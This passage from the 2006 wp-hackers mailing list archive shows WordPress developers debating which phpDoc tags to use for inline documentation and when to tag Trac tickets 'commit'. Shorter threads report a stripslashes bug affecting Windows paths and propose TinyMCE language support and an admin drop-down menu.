	<a491f91d0602161458t4f024c5cw1d6e76d69913b248@mail.gmail.com>
Message-ID: <e6ec604d0602161503t30a833a4x2befb3cbddfc6c4c@mail.gmail.com>

On 2/16/06, Robert Deaton <false.hopes@gmail.com> wrote:
> So, I hope to anyone interested that this doesn't hamper your efforts.
> Personally I hope that even the small functions will be documented,
> even if I have to do them myself, and even if they aren't committed.

That's the spirit.

Rich, now that you have an answer, are you still enthusiastic about
documenting the core?
From theodor_ramisch at hotmail.com  Thu Feb 16 23:03:50 2006
From: theodor_ramisch at hotmail.com (Theodor Ramisch)
Date: Thu Feb 16 23:05:50 2006
Subject: [wp-hackers] Inline documentation
References: <43F33C8D.2010509@rcbowen.com><80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com><116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net><ebe43d680602160627w1d5ac4f1l@mail.gmail.com><43F4E337.7090209@rcbowen.com>
	<43F4E642.3050300@midnightcircus.com><5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com><5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com><a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com><e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
Message-ID: <BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>

Hi,

> Not necessarily seven, template tags need but three
> /**
>  * Outputs the title of a post, sanitized of course
>  **/

one of the plugins I modified last week was very well commented.
Maybe we could use this style. (Is it phpDoc?)
http://dev.wp-plugins.org/file/google-sitemap-generator/trunk/sitemap.php

Theodor
From nuclearmoose at gmail.com  Thu Feb 16 23:04:21 2006
From: nuclearmoose at gmail.com (Craig)
Date: Thu Feb 16 23:06:09 2006
Subject: [wp-hackers] [PATCH] Documentation
In-Reply-To: <e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>
References: <43F5010D.6070304@rcbowen.com>
	<e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>
Message-ID: <5aa3aa0602161504g11c1d485t506033411274cb91@mail.gmail.com>

>From someone trying to learn about the guts of WP, it means not a thing! :\
Craig.


On 2/16/06, Andy Skelton <skeltoac@gmail.com> wrote:
>
> On 2/16/06, Rich Bowen <rbowen@rcbowen.com> wrote:
> > +/** current_time( $type = ('mysql'|'timestamp')
> > +*               [ , $gmt = (true|false) ] )
> > +*/
>
> If this is meant to help people read the code, I think it's too cryptic.
>
> Receipt:
> one opinion, two cents.
> delivery, no charge.
>
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From false.hopes at gmail.com  Thu Feb 16 23:11:25 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Thu Feb 16 23:13:12 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
References: <43F33C8D.2010509@rcbowen.com>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com> <43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
Message-ID: <a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>

On 2/16/06, Theodor Ramisch <theodor_ramisch@hotmail.com> wrote:
> one of the plugins I modified last week was very well commented.
> Maybe we could use this style. (Is it phpDoc?)
> http://dev.wp-plugins.org/file/google-sitemap-generator/trunk/sitemap.php

Yes, that is PHPDoc, and it seems to match perfectly with what I would
like to see in the core, (nothing really complex like what Rich has, I
love the effort, but the format he suggested in the other list is
rather...ick.

--
--Robert Deaton
http://somethingunpredictable.com
From false.hopes at gmail.com  Thu Feb 16 23:15:05 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Thu Feb 16 23:16:56 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com> <43F4E337.7090209@rcbowen.com>
	<43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
Message-ID: <a491f91d0602161515o29c57c9an59284b068c17a03a@mail.gmail.com>

Let me add back in that I think many of the tags that are included
there should be omitted from WordPress. The author, copyright,
version, etc. aren't needed, just param and return really.


--
--Robert Deaton
http://somethingunpredictable.com
From ckunte at gmail.com  Fri Feb 17 00:03:28 2006
From: ckunte at gmail.com (Chetan Kunte)
Date: Fri Feb 17 00:05:19 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <890D8816-75AA-44D5-AB2D-AC522CD7F894@txfx.net>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
	<1139428294.1474.11.camel@localhost.localdomain>
	<6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>
	<ebe43d680602110732t76a7c42fi@mail.gmail.com>
	<a491f91d0602110852o7975d249y4019c4d4f1115563@mail.gmail.com>
	<74b84aa30602121926p5c17805cka8fa55e8f38f685c@mail.gmail.com>
	<890D8816-75AA-44D5-AB2D-AC522CD7F894@txfx.net>
Message-ID: <74b84aa30602161603l3f765b69hb282aea906b33431@mail.gmail.com>

Hi Mark -

Thanks for pointing out. It works like a charm.
--
Chetan, ckunte.com


On 2/13/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> On Feb 12, 2006, at 10:26 PM, Chetan Kunte wrote:
>
> > Also, in Textpattern, when you create a section (Page for WordPress),
> > you don't have to update your htaccess (I still manually append this
> > file whenever I create a new page).
>
> As of WP 2.0, you don't have to update your .htaccess when you add a
> page.  It's all handled by the internal rewriter.
> --
> Mark Jaquith
> http://txfx.net/
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From lists at abhaykumar.net  Fri Feb 17 00:07:24 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Feb 17 00:09:13 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602161515o29c57c9an59284b068c17a03a@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<a491f91d0602161515o29c57c9an59284b068c17a03a@mail.gmail.com>
Message-ID: <512061b90602161607r7df3d3c2n71f73bcb2a7d5d14@mail.gmail.com>

> Let me add back in that I think many of the tags that are included
> there should be omitted from WordPress. The author, copyright,
> version, etc. aren't needed, just param and return really.

My list of what I think should be included (including what was said
above) and why:
* deprecated
** it's useful and we already have depreciated functions that are commented.
* global
** it's always useful to define where the global variable was intially
set. just good practice in general.
* param
** duh
* return
** duh
* since
** i know we have a subversion repository to track this but it's nice
to see it in the code directly.
* todo
** we already have this, might as well conform to a standard
* var
** should be obvious
* link
** provide a link to the codex for a specific function

- Abhay
--
Abhay Kumar
http://abhaykumar.net/
From false.hopes at gmail.com  Fri Feb 17 00:44:59 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Feb 17 00:46:52 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <512061b90602161607r7df3d3c2n71f73bcb2a7d5d14@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<a491f91d0602161515o29c57c9an59284b068c17a03a@mail.gmail.com>
	<512061b90602161607r7df3d3c2n71f73bcb2a7d5d14@mail.gmail.com>
Message-ID: <a491f91d0602161644j26ff575dvac5946bde54eb719@mail.gmail.com>

On 2/16/06, Abhay Kumar <lists@abhaykumar.net> wrote:
> > Let me add back in that I think many of the tags that are included
> > there should be omitted from WordPress. The author, copyright,
> > version, etc. aren't needed, just param and return really.
>
> My list of what I think should be included (including what was said
> above) and why:
> * deprecated
> ** it's useful and we already have depreciated functions that are commented.

I could see this being a useful flag

> * global
> ** it's always useful to define where the global variable was intially
> set. just good practice in general.

This may come in handy, although I think that a more easily readable
file on the codex that has a list of global variables, where they are
defined, modified, etc. would be more useful to everyone, as well as
the cross-references.

</snip>

> * since
> ** i know we have a subversion repository to track this but it's nice
> to see it in the code directly.

This adds extra load of keeping it up to date, and will probably screw
us over on meeting Matt's standards (heaven-forbid we add a tad bit of
size to the core), and so -1.

> * todo
> ** we already have this, might as well conform to a standard

+1, seems reasonable

> * var
> ** should be obvious

Could be useful in classes I suppose, this one I could go either way on.

> * link
> ** provide a link to the codex for a specific function

This is iffy, seems unnecessary, especially since a good deal of the
functions aren't documented properly or throughly enough.


--
--Robert Deaton
http://somethingunpredictable.com
From lists at abhaykumar.net  Fri Feb 17 01:13:23 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Feb 17 01:15:14 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602161644j26ff575dvac5946bde54eb719@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<a491f91d0602161515o29c57c9an59284b068c17a03a@mail.gmail.com>
	<512061b90602161607r7df3d3c2n71f73bcb2a7d5d14@mail.gmail.com>
	<a491f91d0602161644j26ff575dvac5946bde54eb719@mail.gmail.com>
Message-ID: <512061b90602161713s1354f4f8t5ac24ee47f14afd2@mail.gmail.com>

> > [snip]
> > * global
> > ** it's always useful to define where the global variable was intially
> > set. just good practice in general.
>
> This may come in handy, although I think that a more easily readable
> file on the codex that has a list of global variables, where they are
> defined, modified, etc. would be more useful to everyone, as well as
> the cross-references.

I like your suggestion better.

> > * since
> > ** i know we have a subversion repository to track this but it's nice
> > to see it in the code directly.
>
> This adds extra load of keeping it up to date, and will probably screw
> us over on meeting Matt's standards (heaven-forbid we add a tad bit of
> size to the core), and so -1.

I guess but it's nicer to see in the code. I think we should be
conscientious about it.

> [snip]
> > * var
> > ** should be obvious
>
> Could be useful in classes I suppose, this one I could go either way on.

Definiately to be used in classes. It is more useful to put it as
formal comments rather than double slashed comments at the end of the
line.

> > * link
> > ** provide a link to the codex for a specific function
>
> This is iffy, seems unnecessary, especially since a good deal of the
> functions aren't documented properly or throughly enough.
This would be for those functions that do indeed need to be documented
very well. This would especially be useful for API stuff.

- Abhay

--
Abhay Kumar
http://abhaykumar.net/
From wphackers at jamietalbot.com  Fri Feb 17 01:13:48 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Fri Feb 17 01:15:42 2006
Subject: [wp-hackers] trac tags
In-Reply-To: <45B4BB3D-D449-4E1C-86FD-2D9FC8C0507F@txfx.net>
References: <43F4824D.8050005@skippy.net>	<9EA9F3DF-5010-4E29-9306-D3974FD0620E@txfx.net>	<ebe43d680602160556saa0dfb9w@mail.gmail.com>
	<45B4BB3D-D449-4E1C-86FD-2D9FC8C0507F@txfx.net>
Message-ID: <43F5234C.3000103@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Mark Jaquith wrote:
I wasn't at the meetup (have a conflict with the time,
> unfortunately), but I've definitely noticed Matt and Ryan both making
> use of the commit report.

Can anybody put a 'commit' tag onto a bug?  Or does it have to be a dev, bug-gardener, contributing
developer etc...?  If we can, what are the requirements for such a tag to be added?

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD9SNMrovxfShShFARAjuMAJ9UooSsn6bMvKSMFqCDmv3OcpOc1QCfQDGN
vLitse59pR/Mbdn9HsQaQGg=
=/jOo
-----END PGP SIGNATURE-----
From lists at abhaykumar.net  Fri Feb 17 01:18:34 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Feb 17 01:20:23 2006
Subject: [wp-hackers] trac tags
In-Reply-To: <43F5234C.3000103@jamietalbot.com>
References: <43F4824D.8050005@skippy.net>
	<9EA9F3DF-5010-4E29-9306-D3974FD0620E@txfx.net>
	<ebe43d680602160556saa0dfb9w@mail.gmail.com>
	<45B4BB3D-D449-4E1C-86FD-2D9FC8C0507F@txfx.net>
	<43F5234C.3000103@jamietalbot.com>
Message-ID: <512061b90602161718m132bb40cw315a1b1083f9eb5f@mail.gmail.com>

> [snip]
> Can anybody put a 'commit' tag onto a bug?  Or does it have to be a dev, bug-gardener, contributing
> developer etc...?  If we can, what are the requirements for such a tag to be added?

There is no barrier that prevents you from putting in a commit tag
onto a bug. normally when some one wants to submit a patch that should
be looked at by a bug gardener or a dev (if nothing else, for
redundancy), we use the bg|has-patch tag.

-Abhay

--
Abhay Kumar
http://abhaykumar.net/
From skeltoac at gmail.com  Fri Feb 17 01:18:38 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Fri Feb 17 01:20:28 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <512061b90602161713s1354f4f8t5ac24ee47f14afd2@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<a491f91d0602161515o29c57c9an59284b068c17a03a@mail.gmail.com>
	<512061b90602161607r7df3d3c2n71f73bcb2a7d5d14@mail.gmail.com>
	<a491f91d0602161644j26ff575dvac5946bde54eb719@mail.gmail.com>
	<512061b90602161713s1354f4f8t5ac24ee47f14afd2@mail.gmail.com>
Message-ID: <e6ec604d0602161718p6b6b7e58n3245dd29c604a4dc@mail.gmail.com>

On 2/16/06, Abhay Kumar <lists@abhaykumar.net> wrote:
> > > * since
> > > ** i know we have a subversion repository to track this but it's nice
> > > to see it in the code directly.
> >
> > This adds extra load of keeping it up to date, and will probably screw
> > us over on meeting Matt's standards (heaven-forbid we add a tad bit of
> > size to the core), and so -1.
>
> I guess but it's nicer to see in the code. I think we should be
> conscientious about it.

Please don't document "since" in the code. `svn blame <filename>` and
trac are enough.

Andy
From lists at abhaykumar.net  Fri Feb 17 01:21:16 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Feb 17 01:23:05 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <e6ec604d0602161718p6b6b7e58n3245dd29c604a4dc@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<a491f91d0602161515o29c57c9an59284b068c17a03a@mail.gmail.com>
	<512061b90602161607r7df3d3c2n71f73bcb2a7d5d14@mail.gmail.com>
	<a491f91d0602161644j26ff575dvac5946bde54eb719@mail.gmail.com>
	<512061b90602161713s1354f4f8t5ac24ee47f14afd2@mail.gmail.com>
	<e6ec604d0602161718p6b6b7e58n3245dd29c604a4dc@mail.gmail.com>
Message-ID: <512061b90602161721n29214a38va00399fb1d97276c@mail.gmail.com>

> > > > * since
> > > > ** i know we have a subversion repository to track this but it's nice
> > > > to see it in the code directly.
> > >
> > > This adds extra load of keeping it up to date, and will probably screw
> > > us over on meeting Matt's standards (heaven-forbid we add a tad bit of
> > > size to the core), and so -1.
> >
> > I guess but it's nicer to see in the code. I think we should be
> > conscientious about it.
>
> Please don't document "since" in the code. `svn blame <filename>` and
> trac are enough.

If that's the consensus I'm totally fine without it. I was presenting
a list of tags so that we can weed out the ones we don't want / need
to use for the sake of standardization.

- Abhay

--
Abhay Kumar
http://abhaykumar.net/
From wphackers at jamietalbot.com  Fri Feb 17 01:25:49 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Fri Feb 17 01:27:43 2006
Subject: [wp-hackers] trac tags
In-Reply-To: <512061b90602161718m132bb40cw315a1b1083f9eb5f@mail.gmail.com>
References: <43F4824D.8050005@skippy.net>	<9EA9F3DF-5010-4E29-9306-D3974FD0620E@txfx.net>	<ebe43d680602160556saa0dfb9w@mail.gmail.com>	<45B4BB3D-D449-4E1C-86FD-2D9FC8C0507F@txfx.net>	<43F5234C.3000103@jamietalbot.com>
	<512061b90602161718m132bb40cw315a1b1083f9eb5f@mail.gmail.com>
Message-ID: <43F5261D.3040904@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Abhay Kumar wrote:
> There is no barrier that prevents you from putting in a commit tag
> onto a bug. normally when some one wants to submit a patch that should
> be looked at by a bug gardener or a dev (if nothing else, for
> redundancy), we use the bg|has-patch tag.

I know /technically/ there's nothing stopping me from putting 'commit' onto a bug, I just want to
know if it is considered bad form for just any random person (i.e., me) to add it.  It might seem a
bit presumptuous.

And, I think we're using has-patch now, not bg|has-patch?

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD9SYdrovxfShShFARAlUXAKCHOTPJgwGEcEa23KMPyUvz0KN7cACfRTr7
38PEVWbMOjcCGC1xiUJwvW8=
=I6ie
-----END PGP SIGNATURE-----
From ryan at boren.nu  Fri Feb 17 01:52:47 2006
From: ryan at boren.nu (Ryan Boren)
Date: Fri Feb 17 01:54:41 2006
Subject: [wp-hackers] trac tags
In-Reply-To: <43F5261D.3040904@jamietalbot.com>
References: <43F4824D.8050005@skippy.net>	<9EA9F3DF-5010-4E29-9306-D3974FD0620E@txfx.net>	<ebe43d680602160556saa0dfb9w@mail.gmail.com>	<45B4BB3D-D449-4E1C-86FD-2D9FC8C0507F@txfx.net>	<43F5234C.3000103@jamietalbot.com>	<512061b90602161718m132bb40cw315a1b1083f9eb5f@mail.gmail.com>
	<43F5261D.3040904@jamietalbot.com>
Message-ID: <43F52C6F.5080302@boren.nu>

Jamie Talbot wrote:
> Abhay Kumar wrote:
> 
>>There is no barrier that prevents you from putting in a commit tag
>>onto a bug. normally when some one wants to submit a patch that should
>>be looked at by a bug gardener or a dev (if nothing else, for
>>redundancy), we use the bg|has-patch tag.
> 
> 
> I know /technically/ there's nothing stopping me from putting 'commit' onto a bug, I just want to
> know if it is considered bad form for just any random person (i.e., me) to add it.  It might seem a
> bit presumptuous.

I like commit to mean the patch has been tested and reviewed by at least 
  one person beyond the author.  It needs to mean something more than 
has-patch.  I look to see who adds the commit tag and give more weight 
to those I know.  I'm more confident in the commit worthyness of a patch 
when other regular contributors give it the commit tag.  But, anyone who 
has tested the patch can add the tag.  You can also add a comment to the 
bug saying you tested or reviewed it.

Ryan


From wphackers at jamietalbot.com  Fri Feb 17 01:58:45 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Fri Feb 17 02:00:40 2006
Subject: [wp-hackers] trac tags
In-Reply-To: <43F52C6F.5080302@boren.nu>
References: <43F4824D.8050005@skippy.net>	<9EA9F3DF-5010-4E29-9306-D3974FD0620E@txfx.net>	<ebe43d680602160556saa0dfb9w@mail.gmail.com>	<45B4BB3D-D449-4E1C-86FD-2D9FC8C0507F@txfx.net>	<43F5234C.3000103@jamietalbot.com>	<512061b90602161718m132bb40cw315a1b1083f9eb5f@mail.gmail.com>	<43F5261D.3040904@jamietalbot.com>
	<43F52C6F.5080302@boren.nu>
Message-ID: <43F52DD5.8060003@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Ryan Boren wrote:
> I like commit to mean the patch has been tested and reviewed by at least
>  one person beyond the author.  It needs to mean something more than
> has-patch.  I look to see who adds the commit tag and give more weight
> to those I know.  I'm more confident in the commit worthyness of a patch
> when other regular contributors give it the commit tag.  But, anyone who
> has tested the patch can add the tag.  You can also add a comment to the
> bug saying you tested or reviewed it.
> 
> Ryan

Thanks for the clarification Ryan.

Cheers,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD9S3VrovxfShShFARArTkAJ0QrkaFYsnvHLxTvoq/RB0RG4oLtgCeNns9
ys1532UZ0L1TLZaFb8aZflQ=
=eMsy
-----END PGP SIGNATURE-----
From davebytes at comcast.net  Fri Feb 17 05:04:47 2006
From: davebytes at comcast.net (David Chait)
Date: Fri Feb 17 05:08:40 2006
Subject: [wp-hackers] someone tell me if I'm nuts,
	but isn't stripslashes_deep on $_SERVER a bad thing?
Message-ID: <009f01c6337f$af4a40a0$6e01a8c0@sixfour>

I was trying to test out WP-Cache under WP2[trunk], and I'm on a WAMP setup 
here.  Fixed a few problems related to being on windows (using symlink 
functions... grrr...) that was killing initial testing the admin panel does. 
Then got the panel to show up, everything looking good so far.

BUT THEN, I try to click Enable It, and get an error about not being able to 
find a file.  hmmm.

The panel (and posted) URL is something like:
http://localhost/wp20test/wp-admin/options-general.php?page=wp-cache\wp-cache.php

Since the POST is being done to $_SERVER['REQUEST_URI'], which gets 
stripped, the POST URL is actually turned into:
http://localhost/wp20test/wp-admin/options-general.php?page=wp-cachewp-cache.php

... which blows the admin panel's ability to do form POSTs.  Now, in theory, 
I could make the action="", right?  ("" == current URI, no?).  (I just 
switched all the REQUEST_URI's to blanks, that seemed to work for the Enable 
button...)

Anyhow, isn't it a bad thing to do stripslashes on potentially 
validly-backslashed strings like a windows path?  Should stripslashes be run 
at ALL on $_SERVER (my own projects I've only ever done so on 
get/post/cookie...)?

(Hey, while I'm asking wacky questions, anyone have an idea why when I click 
the Admin : Options : Permalink tab, Apache crashes?  This is Wampserver, 
apache 1.3.x, php5...  I >think< rewrites were working in an older WP1.5 
build, same box...)

Thanks,

-d 

From mark.wordpress at txfx.net  Fri Feb 17 05:15:12 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Feb 17 05:17:06 2006
Subject: [wp-hackers] someone tell me if I'm nuts,
	but isn't stripslashes_deep on $_SERVER a bad thing?
In-Reply-To: <009f01c6337f$af4a40a0$6e01a8c0@sixfour>
References: <009f01c6337f$af4a40a0$6e01a8c0@sixfour>
Message-ID: <7CE48834-40B0-4FCF-9CF2-14331C20876C@txfx.net>

On Feb 17, 2006, at 12:04 AM, David Chait wrote:

> (Hey, while I'm asking wacky questions, anyone have an idea why  
> when I click
> the Admin : Options : Permalink tab, Apache crashes?  This is  
> Wampserver,
> apache 1.3.x, php5...  I >think< rewrites were working in an older  
> WP1.5
> build, same box...)

Because of this bug, likely:
http://trac.wordpress.org/ticket/2367
--
Mark Jaquith
http://txfx.net/


From dmhouse at gmail.com  Fri Feb 17 09:27:44 2006
From: dmhouse at gmail.com (David House)
Date: Fri Feb 17 09:29:36 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <512061b90602161721n29214a38va00399fb1d97276c@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<a491f91d0602161515o29c57c9an59284b068c17a03a@mail.gmail.com>
	<512061b90602161607r7df3d3c2n71f73bcb2a7d5d14@mail.gmail.com>
	<a491f91d0602161644j26ff575dvac5946bde54eb719@mail.gmail.com>
	<512061b90602161713s1354f4f8t5ac24ee47f14afd2@mail.gmail.com>
	<e6ec604d0602161718p6b6b7e58n3245dd29c604a4dc@mail.gmail.com>
	<512061b90602161721n29214a38va00399fb1d97276c@mail.gmail.com>
Message-ID: <ebe43d680602170127r5733a67dp@mail.gmail.com>

On 17/02/06, Abhay Kumar <lists@abhaykumar.net> wrote:
> If that's the consensus I'm totally fine without it. I was presenting
> a list of tags so that we can weed out the ones we don't want / need
> to use for the sake of standardization.

Yeah, I'm with Andy on this. No point duplicating our information.
@param, @return are probably the only two used on a regular basis.
Perhaps @todo when we have one or two functions that need it. I'm not
sure anything else is necessary.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From steagl at people.it  Fri Feb 17 12:28:32 2006
From: steagl at people.it (Stefano)
Date: Fri Feb 17 12:30:35 2006
Subject: [wp-hackers] Language support for TinyMCE
References: <20060216132742.h19k6wvs0k0cssso@cs18.simplehost.com>
Message-ID: <a9gbv1952d2us5qjd00uqaemmn0qf5ub13@4ax.com>

Il Thu, 16 Feb 2006 13:27:42 -0500, Kirk Steffensen
<blogger@steffensenfamily.com> scrive:

>WP Hackers,
>
>Below is a proposed change to wp-includes/js/tinymce/tiny_mce_gzip.php to
>restore native TinyMCE language support.  Before I post this to Trac as an
>enhancement, I wanted to make sure that I'm not missing something.  If no one
>points out a logic error or a better way to build the mousetrap, I'll make a
>patch and post it to Trac.

+1 for me.

I think you could submit the patch to trac so bug gardeners will check
it and then Ryan will do too.

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From steagl at people.it  Fri Feb 17 12:33:45 2006
From: steagl at people.it (Stefano)
Date: Fri Feb 17 12:35:46 2006
Subject: [wp-hackers] Poposal to improve Admin menu
Message-ID: <3fgbv1hlotvrlvopnv1g50hnrf82kj1gm3@4ax.com>

I think that the functionality actually provided by the great plugin
from Ozh: Admin Drop Down Menu
(http://frenchfragfactory.net/ozh/my-projects/wordpress-admin-menu-drop-down-css/)
should be included in 2.next release. It' improve the usability,
making jump aorun various admin screen fast.

What do you think?

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From rbowen at rcbowen.com  Fri Feb 17 13:34:26 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Fri Feb 17 13:36:23 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <e6ec604d0602161503t30a833a4x2befb3cbddfc6c4c@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>	<43F4E337.7090209@rcbowen.com>
	<43F4E642.3050300@midnightcircus.com>	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<a491f91d0602161458t4f024c5cw1d6e76d69913b248@mail.gmail.com>
	<e6ec604d0602161503t30a833a4x2befb3cbddfc6c4c@mail.gmail.com>
Message-ID: <43F5D0E2.4040900@rcbowen.com>

Andy Skelton wrote:
> On 2/16/06, Robert Deaton <false.hopes@gmail.com> wrote:
>> So, I hope to anyone interested that this doesn't hamper your efforts.
>> Personally I hope that even the small functions will be documented,
